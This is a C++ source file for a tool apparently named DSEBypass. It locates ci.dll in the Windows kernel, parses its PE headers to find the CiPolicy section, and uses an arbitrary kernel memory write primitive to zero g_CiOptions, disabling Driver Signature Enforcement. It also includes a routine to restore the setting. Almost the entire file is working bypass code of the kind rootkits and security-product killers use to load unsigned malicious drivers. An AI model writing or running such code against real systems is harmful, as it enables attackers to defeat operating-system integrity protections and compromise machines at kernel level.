#include "DSEBypass.h"
#include "common.h"

#pragma comment(lib, "ntdll.lib")

// Kernel module structures
typedef struct _SYSTEM_MODULE {
    ULONG_PTR Reserved1;
    ULONG_PTR Reserved2;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT PathLength;
    CHAR ImageName[256];
} SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

DSEBypass::DSEBypass(std::unique_ptr<kvc>& rtc) : m_rtc(rtc) {}

bool DSEBypass::DisableDSE() noexcept {
    DEBUG(L"[DSE] Attempting to disable Driver Signature Enforcement...");
    
    // Step 1: Find ci.dll base address
    auto ciBase = GetKernelModuleBase("ci.dll");
    if (!ciBase) {
        ERROR(L"[DSE] Failed to locate ci.dll");
        return false;
    }
    
    DEBUG(L"[DSE] ci.dll base: 0x%llX", ciBase.value());
    
    // Step 2: Locate g_CiOptions in CiPolicy section
    m_ciOptionsAddr = FindCiOptions(ciBase.value());
    if (!m_ciOptionsAddr) {
        ERROR(L"[DSE] Failed to locate g_CiOptions");
        return false;
    }
    
    DEBUG(L"[DSE] g_CiOptions address: 0x%llX", m_ciOptionsAddr);
    
    // Step 3: Read current value
    auto current = m_rtc->Read32(m_ciOptionsAddr);
    if (!current) {
        ERROR(L"[DSE] Failed to read g_CiOptions");
        return false;
    }
    
    DWORD currentValue = current.value();
    m_originalValue = currentValue;
    DEBUG(L"[DSE] Current g_CiOptions: 0x%08X", currentValue);
    
    // Step 4: Check for ANY HVCI/VBS protection bits
    if (currentValue & 0x0001C000) {
        ERROR(L"[!] Cannot proceed: g_CiOptions = 0x%08X (HVCI flags: 0x%05X)", 
              currentValue, (currentValue & 0x0001C000));
        ERROR(L"[!] System uses VBS with hypervisor protection (Ring -1 below kernel)");
        ERROR(L"[!] Memory integrity enforced at hardware virtualization level");
        ERROR(L"[!] DSE bypass impossible - disable VBS in BIOS/Windows Security");
        return false;
    }
    
    // Step 5: Verify we have patchable DSE (0x00000006)
    if (currentValue != 0x00000006) {
        ERROR(L"[DSE] Unexpected g_CiOptions value: 0x%08X (expected: 0x00000006)", currentValue);
        ERROR(L"[DSE] DSE may already be disabled or system configuration unsupported");
        return false;
    }
    
    // Step 6: Disable DSE by clearing bits 1 and 2
    DWORD newValue = 0x00000000;
    
    if (!m_rtc->Write32(m_ciOptionsAddr, newValue)) {
        ERROR(L"[DSE] Failed to write g_CiOptions");
        return false;
    }
    
    // Step 7: Verify the change
    auto verify = m_rtc->Read32(m_ciOptionsAddr);
    if (!verify || verify.value() != newValue) {
        ERROR(L"[DSE] Verification failed (expected: 0x%08X, got: 0x%08X)", 
              newValue, verify ? verify.value() : 0xFFFFFFFF);
        return false;
    }
    
    SUCCESS(L"[DSE] DSE disabled successfully! (0x%08X -> 0x%08X)", currentValue, newValue);
    return true;
}

bool DSEBypass::RestoreDSE() noexcept {
    DEBUG(L"[DSE] Attempting to restore Driver Signature Enforcement...");
    
    // Step 1: Find ci.dll base address
    auto ciBase = GetKernelModuleBase("ci.dll");
    if (!ciBase) {
        ERROR(L"[DSE] Failed to locate ci.dll");
        return false;
    }
    
    // Step 2: Locate g_CiOptions
    m_ciOptionsAddr = FindCiOptions(ciBase.value());
    if (!m_ciOptionsAddr) {
        ERROR(L"[DSE] Failed to locate g_CiOptions");
        return false;
    }
    
    DEBUG(L"[DSE] g_CiOptions address: 0x%llX", m_ciOptionsAddr);
    
    // Step 3: Read current value
    auto current = m_rtc->Read32(m_ciOptionsAddr);
    if (!current) {
        ERROR(L"[DSE] Failed to read g_CiOptions");
        return false;
    }
    
    DWORD currentValue = current.value();
    DEBUG(L"[DSE] Current g_CiOptions: 0x%08X", currentValue);
    
    // Step 4: Verify DSE is disabled (0x00000000)
    if (currentValue != 0x00000000) {
        ERROR(L"[DSE] Unexpected g_CiOptions value: 0x%08X (expected: 0x00000000)", currentValue);
        ERROR(L"[DSE] DSE may already be enabled or system configuration unsupported");
        return false;
    }
    
    // Step 5: Restore DSE bits
    DWORD newValue = 0x00000006;
    
    if (!m_rtc->Write32(m_ciOptionsAddr, newValue)) {
        ERROR(L"[DSE] Failed to write g_CiOptions");
        return false;
    }
    
    // Step 6: Verify the change
    auto verify = m_rtc->Read32(m_ciOptionsAddr);
    if (!verify || verify.value() != newValue) {
        ERROR(L"[DSE] Verification failed (expected: 0x%08X, got: 0x%08X)", 
              newValue, verify ? verify.value() : 0xFFFFFFFF);
        return false;
    }
    
    SUCCESS(L"[DSE] DSE restored successfully! (0x%08X -> 0x%08X)", currentValue, newValue);
    return true;
}

std::optional<ULONG_PTR> DSEBypass::GetKernelModuleBase(const char* moduleName) noexcept {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        ERROR(L"[DSE] Failed to get ntdll.dll handle");
        return std::nullopt;
    }

    typedef NTSTATUS (WINAPI *NTQUERYSYSTEMINFORMATION)(
        ULONG SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
    );

    auto pNtQuerySystemInformation = reinterpret_cast<NTQUERYSYSTEMINFORMATION>(
        GetProcAddress(hNtdll, "NtQuerySystemInformation"));
    
    if (!pNtQuerySystemInformation) {
        ERROR(L"[DSE] Failed to get NtQuerySystemInformation");
        return std::nullopt;
    }

    // First call to get required buffer size
    ULONG bufferSize = 0;
    NTSTATUS status = pNtQuerySystemInformation(
        11, // SystemModuleInformation
        nullptr, 
        0, 
        &bufferSize
    );

    if (status != 0xC0000004L) { // STATUS_INFO_LENGTH_MISMATCH
        ERROR(L"[DSE] NtQuerySystemInformation failed with status: 0x%08X", status);
        return std::nullopt;
    }

    // Allocate buffer and get module list
    auto buffer = std::make_unique<BYTE[]>(bufferSize);
    auto modules = reinterpret_cast<PSYSTEM_MODULE_INFORMATION>(buffer.get());
    
    status = pNtQuerySystemInformation(
        11, // SystemModuleInformation
        modules,
        bufferSize,
        &bufferSize
    );

    if (status != 0) {
        ERROR(L"[DSE] NtQuerySystemInformation failed (2nd call): 0x%08X", status);
        return std::nullopt;
    }

    // Search for target module by name
    for (ULONG i = 0; i < modules->Count; i++) {
        auto& mod = modules->Modules[i];
        
        // Extract filename from full path
        const char* fileName = strrchr(mod.ImageName, '\\');
        if (fileName) {
            fileName++; // Skip backslash
        } else {
            fileName = mod.ImageName;
        }
        
        if (_stricmp(fileName, moduleName) == 0) {
            ULONG_PTR baseAddr = reinterpret_cast<ULONG_PTR>(mod.ImageBase);
            
            if (baseAddr == 0) {
                ERROR(L"[DSE] Module %S found but ImageBase is NULL", moduleName);
                continue;
            }
            
            DEBUG(L"[DSE] Found %S at 0x%llX (size: 0x%X)", moduleName, baseAddr, mod.ImageSize);
            return baseAddr;
        }
    }
    
    ERROR(L"[DSE] Module %S not found in kernel", moduleName);
    return std::nullopt;
}

ULONG_PTR DSEBypass::FindCiOptions(ULONG_PTR ciBase) noexcept {
    DEBUG(L"[DSE] Searching for g_CiOptions in ci.dll at base 0x%llX", ciBase);
    
    // Get CiPolicy section information
    auto dataSection = GetDataSection(ciBase);
    if (!dataSection) {
        ERROR(L"[DSE] Failed to locate CiPolicy section in ci.dll");
        return 0;
    }
    
    ULONG_PTR dataStart = dataSection->first;
    SIZE_T dataSize = dataSection->second;
    
    DEBUG(L"[DSE] CiPolicy section: 0x%llX (size: 0x%llX)", dataStart, dataSize);
    
    // g_CiOptions is always at offset +4 in CiPolicy section
    ULONG_PTR ciOptionsAddr = dataStart + 0x4;
    
    // Verify we can read from this address
    auto currentValue = m_rtc->Read32(ciOptionsAddr);
    if (!currentValue) {
        ERROR(L"[DSE] Failed to read g_CiOptions at 0x%llX", ciOptionsAddr);
        return 0;
    }
    
    DEBUG(L"[DSE] Found g_CiOptions at: 0x%llX (value: 0x%08X)", ciOptionsAddr, currentValue.value());
    return ciOptionsAddr;
}

std::optional<std::pair<ULONG_PTR, SIZE_T>> DSEBypass::GetDataSection(ULONG_PTR moduleBase) noexcept {
    // Read DOS header (MZ signature)
    auto dosHeader = m_rtc->Read16(moduleBase);
    if (!dosHeader || dosHeader.value() != 0x5A4D) {
        return std::nullopt;
    }
    
    // Get PE header offset
    auto e_lfanew = m_rtc->Read32(moduleBase + 0x3C);
    if (!e_lfanew || e_lfanew.value() > 0x1000) {
        return std::nullopt;
    }
    
    ULONG_PTR ntHeaders = moduleBase + e_lfanew.value();
    
    // Verify PE signature
    auto peSignature = m_rtc->Read32(ntHeaders);
    if (!peSignature || peSignature.value() != 0x4550) {
        return std::nullopt;
    }
    
    // Get section count
    auto numSections = m_rtc->Read16(ntHeaders + 0x6);
    if (!numSections || numSections.value() > 50) {
        return std::nullopt;
    }
    
    auto sizeOfOptionalHeader = m_rtc->Read16(ntHeaders + 0x14);
    if (!sizeOfOptionalHeader) return std::nullopt;
    
    ULONG_PTR firstSection = ntHeaders + 4 + 20 + sizeOfOptionalHeader.value();
    
    DEBUG(L"[DSE] Scanning %d sections for CiPolicy...", numSections.value());
    
    // Search for CiPolicy section
    for (WORD i = 0; i < numSections.value(); i++) {
        ULONG_PTR sectionHeader = firstSection + (i * 40);
        
        // Read section name (8 bytes)
        char name[9] = {0};
        for (int j = 0; j < 8; j++) {
            auto ch = m_rtc->Read8(sectionHeader + j);
            if (ch) name[j] = static_cast<char>(ch.value());
        }
        
        // Check if this is CiPolicy
        if (strcmp(name, "CiPolicy") == 0) {
            auto virtualSize = m_rtc->Read32(sectionHeader + 0x08);
            auto virtualAddr = m_rtc->Read32(sectionHeader + 0x0C);
            
            if (virtualSize && virtualAddr) {
                DEBUG(L"[DSE] Found CiPolicy section at RVA 0x%06X, size 0x%06X", 
                     virtualAddr.value(), virtualSize.value());
                
                return std::make_pair(
                    moduleBase + virtualAddr.value(),
                    static_cast<SIZE_T>(virtualSize.value())
                );
            }
        }
    }
    
    ERROR(L"[DSE] CiPolicy section not found in ci.dll");
    return std::nullopt;
}